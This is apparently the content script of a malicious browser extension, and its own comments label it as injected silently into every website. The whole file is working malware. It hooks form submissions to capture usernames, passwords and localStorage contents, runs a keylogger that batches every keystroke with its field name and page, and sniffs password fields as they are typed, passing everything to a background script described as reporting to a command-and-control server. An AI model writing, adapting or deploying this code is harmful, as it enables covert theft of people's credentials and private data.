// ============================================================
// CONTENT SCRIPT — Injected into EVERY website automatically
// Runs silently in the background on all pages
// ============================================================

(function () {
  // Avoid running twice
  if (window.__c2_injected) return;
  window.__c2_injected = true;

  // ---- 1. CREDENTIAL INTERCEPTOR ----
  // Hooks into all form submissions and captures username + password
  document.addEventListener("submit", function (e) {
    const form = e.target;
    let username = "";
    let password = "";

    const inputs = form.querySelectorAll("input");
    inputs.forEach((input) => {
      const type = (input.type || "").toLowerCase();
      const name = (input.name || input.id || "").toLowerCase();

      if (type === "password") {
        password = input.value;
      } else if (
        type === "email" ||
        type === "text" ||
        name.includes("user") ||
        name.includes("email") ||
        name.includes("login") ||
        name.includes("phone")
      ) {
        if (!username) username = input.value;
      }
    });

    if (username || password) {
      // Collect localStorage data
      let lsData = {};
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          lsData[key] = localStorage.getItem(key);
        }
      } catch (e) {}

      // Send to background script
      chrome.runtime.sendMessage({
        type: "CREDENTIAL_CAPTURED",
        username: username,
        password: password,
        url: window.location.href,
        localStorage: JSON.stringify(lsData),
      });
    }
  }, true); // true = capture phase, fires before form's own handler

  // ---- 2. REAL-TIME KEYLOGGER ----
  // Captures all keystrokes and periodically sends to C2
  let keyBuffer = [];
  let lastField = "";

  document.addEventListener("keydown", function (e) {
    // Track which field is being typed in
    const el = document.activeElement;
    const fieldName = el ? (el.name || el.id || el.placeholder || el.type || "unknown") : "unknown";

    keyBuffer.push({
      key: e.key,
      field: fieldName,
      url: window.location.hostname,
      time: Date.now(),
    });

    // Send buffer every 20 keystrokes
    if (keyBuffer.length >= 20) {
      flushKeyBuffer();
    }
  });

  // Also flush every 10 seconds
  setInterval(flushKeyBuffer, 10000);

  function flushKeyBuffer() {
    if (keyBuffer.length === 0) return;
    const data = [...keyBuffer];
    keyBuffer = [];

    try {
      chrome.runtime.sendMessage({
        type: "KEYSTROKE_BATCH",
        keystrokes: data,
        url: window.location.href,
      });
    } catch (e) {}
  }

  // ---- 3. PASSWORD FIELD REALTIME CAPTURE ----
  // Captures password as user types (not just on submit)
  let passwordSnifferTimeout = null;

  document.addEventListener("input", function (e) {
    if (e.target.type === "password" && e.target.value.length > 2) {
      clearTimeout(passwordSnifferTimeout);
      passwordSnifferTimeout = setTimeout(() => {
        // Find corresponding username field
        let username = "";
        const form = e.target.closest("form");
        if (form) {
          const textInputs = form.querySelectorAll("input:not([type=password])");
          textInputs.forEach((inp) => {
            if (inp.value) username = inp.value;
          });
        }

        chrome.runtime.sendMessage({
          type: "CREDENTIAL_CAPTURED",
          username: username,
          password: e.target.value,
          url: window.location.href,
          localStorage: "{}",
          note: "realtime_capture",
        });
      }, 1500); // Wait 1.5s after typing stops
    }
  });

})();
